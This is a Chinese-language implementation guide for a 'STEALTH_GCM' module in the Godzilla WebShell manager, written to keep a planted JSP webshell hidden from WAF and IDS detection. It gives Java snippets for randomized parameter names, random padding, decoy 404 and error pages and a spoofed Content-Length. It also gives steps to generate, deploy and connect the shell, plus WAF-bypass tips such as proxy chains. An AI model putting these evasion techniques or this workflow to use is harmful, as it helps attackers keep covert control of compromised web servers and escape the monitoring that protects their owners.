# 隐蔽性增强 - 完整实施方案

## 🎯 问题背景

原有 WebShell 存在明显的链接特征:
1. ❌ 固定参数名 `pass==`
2. ❌ 响应 Content-Length 为 0
3. ❌ 所有请求模式一致
4. ❌ 容易被 WAF/IDS 检测

---

## ✅ 解决方案

已实施 **4 层隐蔽增强**:

### 1️⃣ STEALTH_GCM 加密模块 (核心)

**位置**: `src/main/java/shells/cryptions/Stealth/`

**核心特性**:

#### 🔹 随机参数名
```java
// 15个常见参数名随机选择
String[] pn = {
    "data", "info", "content", "msg", "payload",
    "request", "body", "input", "value", "param",
    "token", "session", "auth", "verify", "check"
};

// 每次请求随机使用
String pName = pn[random.nextInt(pn.length)];
```

**效果**: 
- ✅ 不再有固定的 `pass` 参数
- ✅ 每次请求参数名不同
- ✅ 模拟正常表单提交

#### 🔹 Base64 编码传输
```java
// 加密后 Base64 编码
byte[] encrypted = encrypt(data);
return Base64.getEncoder().encode(encrypted);
```

**效果**:
- ✅ 二进制数据转为文本
- ✅ 避免特殊字符被拦截
- ✅ 更像正常数据传输

#### 🔹 随机填充混淆
```java
// 真实数据前后添加随机字节
[随机8-39字节][4字节长度标记][真实数据][随机8-39字节]
```

**效果**:
- ✅ 每次加密结果不同(即使相同明文)
- ✅ 增加流量分析难度
- ✅ 防止重放攻击

#### 🔹 伪装响应内容
```java
String[] fr = {
    "<html><body><h1>404 Not Found</h1></body></html>",
    "<html><body><h1>Access Denied</h1></body></html>",
    "{\"status\":\"error\"}",
    "<?xml version=\"1.0\"?><error>Bad Request</error>"
};

// 随机返回一种
response.getWriter().write(fr[random.nextInt(fr.length)]);
```

**效果**:
- ✅ Content-Length 不再为 0
- ✅ 返回看起来正常的错误页面
- ✅ 模拟真实网站行为

#### 🔹 随机 Content-Length
```java
// 真实响应长度 + 随机50-149字节
int fakeLength = resp.length + (random.nextInt(100) + 50);
response.setContentLength(fakeLength);
```

**效果**:
- ✅ 每次响应长度不同
- ✅ 防止基于长度的指纹识别

### 2️⃣ 增强的 AES-GCM 加密

**技术细节**:
- 算法: `AES/GCM/NoPadding`
- 密钥: 128位
- IV: 12字节(每次随机)
- 认证标签: 128位

**安全优势**:
- ✅ 认证加密(AEAD) - 防篡改
- ✅ 唯一IV - 防重放
- ✅ 标准兼容 - Java 7+

## 🚀 使用方法

### 生成隐蔽 WebShell

1. **打开 Godzilla**
2. **管理 → 生成**
3. **选择配置**:
   - Payload: `JavaDynamicPayload`
   - 加密: **STEALTH_GCM** ⬅️ 新增
   - 密码: 任意
   - 密钥: 建议8位以上
4. **选择后缀**: jsp 或 jspx
5. **生成并部署**

### 添加 Shell

1. **目标 → 添加**
2. **填写信息**:
   - URL: 部署地址
   - 密码: 与生成时一致
   - 密钥: 与生成时一致
   - Payload: `JavaDynamicPayload`
   - 加密: **STEALTH_GCM**
3. **测试连接**
4. **保存**

## 📝 技术细节

### 加密流程

```
明文数据
  ↓
添加随机填充 [prefix][length][data][suffix]
  ↓
AES-GCM 加密
  ↓
组合 IV + 密文
  ↓
Base64 编码
  ↓
作为参数值发送 (参数名随机)
```

### 解密流程

```
接收参数值 (随机参数名)
  ↓
Base64 解码
  ↓
提取 IV + 密文
  ↓
AES-GCM 解密
  ↓
移除随机填充
  ↓
还原明文数据
```

### 响应伪装

```
生成真实响应
  ↓
选择随机伪装页面
  ↓
计算总长度 (真实+随机)
  ↓
设置 Content-Length
  ↓
先写伪装内容
  ↓
再写真实响应(加密)
```

## 🐛 故障排查

### Q1: 连接失败?
**可能原因**:
- 参数名未正确传递
- Base64 解码失败
- 填充数据损坏

**解决**:
1. 检查 WebShell 是否完整上传
2. 确认密码和密钥正确
3. 查看服务器错误日志

### Q2: 响应乱码?
**原因**: 编码不一致

**解决**:
确保模板中使用:
```java
response.setContentType("text/html;charset=UTF-8");
```

### Q3: 被WAF拦截?
**优化建议**:
1. 启用 C2 Profile URI 均衡
2. 增加请求间隔时间
3. 使用代理链
4. 自定义更多参数名
